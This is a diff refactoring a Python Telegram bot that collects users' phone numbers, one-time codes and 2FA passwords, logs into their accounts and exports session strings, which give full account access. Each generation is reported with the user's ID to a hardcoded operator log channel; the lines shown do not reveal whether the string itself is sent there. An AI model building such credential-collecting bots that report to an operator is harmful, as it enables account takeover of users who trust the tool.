@@ -3,34 +3,28 @@ import asyncio
 import logging
 from dotenv import load_dotenv
 from telethon import TelegramClient
-from pyrogram.session import StringSession as PyroString
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from pyrogram import Client as PyroClient
-from telegram.constants import ParseMode
-from pyrogram.raw.all import layer
-from pyrogram.types import User
-try:
-    from pyrogram.session.string_session import StringSession as PyroString
-except ImportError:
-    from pyrogram.session import StringSession as PyroString  # fallback for Pyrogram v1
+from pyrogram.session import StringSession as PyroString
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
+from telegram.constants import ParseMode
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
+    MessageHandler, ContextTypes, filters
+)
 
-# Load from .env or app.json
 load_dotenv()
+
 DEFAULT_API_ID = int(os.getenv("API_ID", "123456"))
 DEFAULT_API_HASH = os.getenv("API_HASH", "abc123")
 LOG_CHANNEL = int(os.getenv("LOG_CHANNEL", "-1002753939875"))
+TOKEN = os.getenv("BOT_TOKEN")
 
-# Setup logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Runtime state
 user_state = {}
-sessions = {}
 
-# Welcome Message
 WELCOME_TEXT = (
     "👋 ʜᴇʏ : Z E U S ⚡,\n\n"
     "✨ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ѕᴇѕѕɪᴏɴ ѕᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ!\n\n"
@@ -56,6 +50,7 @@ HELP_TEXT = (
     "⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ vallahalla team"
 )
 
+# --- Handlers ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("🔘 Generate Session", callback_data="generate")],
@@ -86,10 +81,12 @@ async def generate_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("⬅️ Back to Home", callback_data="home")]
     ])
     await update.callback_query.message.edit_text("Choose your session type:", reply_markup=keyboard)
+
 async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
+    user_id = query.from_user.id
 
     if data == "help":
         await help_menu(update, context)
@@ -98,7 +95,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "generate":
         await generate_session(update, context)
     elif data in ["pyro1", "pyro2", "telethon", "pyrobot", "telebot"]:
-        user_id = query.from_user.id
         user_state[user_id] = {"lib": data}
         await query.message.reply_text("๏ ꜱᴇɴᴅ ᴀᴘɪ_ɪᴅ ᴏʀ /skip")
     else:
@@ -130,26 +126,26 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Invalid API_ID")
         return
 
-    if state.get("step") == "api_hash":
+    if step == "api_hash":
         state["api_hash"] = text
         state["step"] = "phone"
         await update.message.reply_text("📱 Now send your phone number (with +country code)")
         return
 
-    if state.get("step") == "phone":
+    if step == "phone":
         state["phone"] = text
         state["step"] = "otp"
         await update.message.reply_text("📨 Send the OTP you receive")
         asyncio.create_task(send_code(update, context))
         return
 
-    if state.get("step") == "otp":
+    if step == "otp":
         state["code"] = text
         await update.message.reply_text("⏳ Verifying...")
         asyncio.create_task(login_and_generate(update, context))
         return
 
-    if state.get("step") == "2fa":
+    if step == "2fa":
         state["password"] = text
         await update.message.reply_text("🔐 Logging in with password...")
         asyncio.create_task(login_and_generate(update, context))
@@ -168,8 +164,8 @@ async def send_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.connect()
         await client.send_code_request(phone)
         state["client"] = client
-    elif lib.startswith("pyro"):
-        session = PyroString("")
+    else:
+        session = PyroString()
         client = PyroClient(session_name=session, api_id=api_id, api_hash=api_hash, in_memory=True)
         await client.start()
         sent_code = await client.send_code(phone)
@@ -204,10 +200,8 @@ async def login_and_generate(update: Update, context: ContextTypes.DEFAULT_TYPE)
             string = client.export_session_string()
             await client.stop()
 
-        # Send session to user
         await update.message.reply_text(f"✅ **Your String Session:**\n\n`{string}`\n\n🔒 Keep it safe!", parse_mode=ParseMode.MARKDOWN)
 
-        # Log to log channel
         msg = (
             f"⚙️ **New Session Generated**\n\n"
             f"👤 User: `{user_id}`\n"
@@ -217,22 +211,19 @@ async def login_and_generate(update: Update, context: ContextTypes.DEFAULT_TYPE)
         )
         await context.bot.send_message(LOG_CHANNEL, msg)
 
-        # Cleanup
         del user_state[user_id]
     except PhoneCodeInvalidError:
         await update.message.reply_text("❌ Invalid OTP. Try again.")
     except Exception as e:
         await update.message.reply_text(f"❌ Error: `{str(e)}`", parse_mode=ParseMode.MARKDOWN)
 
-# Run the bot
+# --- Run the bot ---
 if __name__ == "__main__":
-    TOKEN = os.getenv("BOT_TOKEN")
     if not TOKEN:
         print("BOT_TOKEN is missing from environment.")
         exit()
 
     app = ApplicationBuilder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
